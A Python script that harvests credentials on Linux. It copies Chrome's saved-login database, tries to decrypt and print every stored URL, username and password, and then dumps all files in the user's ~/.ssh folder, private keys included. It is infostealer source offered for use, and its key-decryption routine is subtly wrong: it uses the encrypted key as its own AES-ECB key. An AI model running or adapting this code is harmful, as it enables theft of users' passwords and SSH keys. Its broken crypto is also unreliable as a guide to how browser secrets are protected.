import os
import json
import base64
import sqlite3
import shutil
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

TEMP_DB_PATH = "Loginvault.db"


def get_chrome_local_state():
    local_state_path = os.path.join(os.environ['HOME'], '.config', 'google-chrome', 'Local State')
    with open(local_state_path, "r", encoding='utf-8') as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    return local_state


def get_master_key(local_state):
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    master_key = decrypt_master_key(encrypted_key)
    return master_key


def decrypt_master_key(encrypted_key):
    try:
        cipher = Cipher(algorithms.AES(encrypted_key), modes.ECB(), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_key = decryptor.update(encrypted_key) + decryptor.finalize()
        return decrypted_key[:-16]  # removing suffix bytes
    except Exception as e:
        print(f"Error decrypting master key: {e}")
        return None


def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)


def generate_cipher(aes_key, iv):
    return Cipher(algorithms.AES(aes_key), modes.GCM(iv), backend=default_backend())


def decrypt_password(buffer, master_key):
    try:
        iv, payload = buffer[3:15], buffer[15:]
        cipher = generate_cipher(master_key, iv)
        decryptor = cipher.decryptor()
        decrypted_pass = decryptor.update(payload) + decryptor.finalize()
        return decrypted_pass.decode()
    except Exception as e:
        print(f"Error decrypting password: {e}")
        return "Chrome < 80"


def get_ssh():
    ssh_folder_path = os.path.join(os.environ['HOME'], '.ssh')

    try:
        if os.path.exists(ssh_folder_path):
            for filename in os.listdir(ssh_folder_path):
                file_path = os.path.join(ssh_folder_path, filename)
                with open(file_path, 'r') as ssh_file:
                    file_contents = ssh_file.read()
                    print(f"File: {filename}\nContents: {file_contents}\n{'*' * 50}\n")
        else:
            print(".ssh folder not found.")
    except Exception as e:
        print(f"Error processing .ssh folder: {e}")


def main():
    local_state = get_chrome_local_state()
    master_key = get_master_key(local_state)

    login_db_path = os.path.join(os.environ['HOME'], '.config', 'google-chrome', 'Default', 'Login Data')
    shutil.copy2(login_db_path, TEMP_DB_PATH)

    with sqlite3.connect(TEMP_DB_PATH) as conn:
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for row in cursor.fetchall():
                url, username, encrypted_password = row[0], row[1], row[2]
                decrypted_password = decrypt_password(encrypted_password, master_key)
                print(f"URL: {url}\nUser Name: {username}\nPassword: {decrypted_password}\n{'*' * 50}\n")
        except Exception as e:
            print(f"Error querying database: {e}")

    try:
        os.remove(TEMP_DB_PATH)
    except Exception as e:
        print(f"Error removing temp database: {e}")
    get_ssh()

if __name__ == '__main__':
    main()
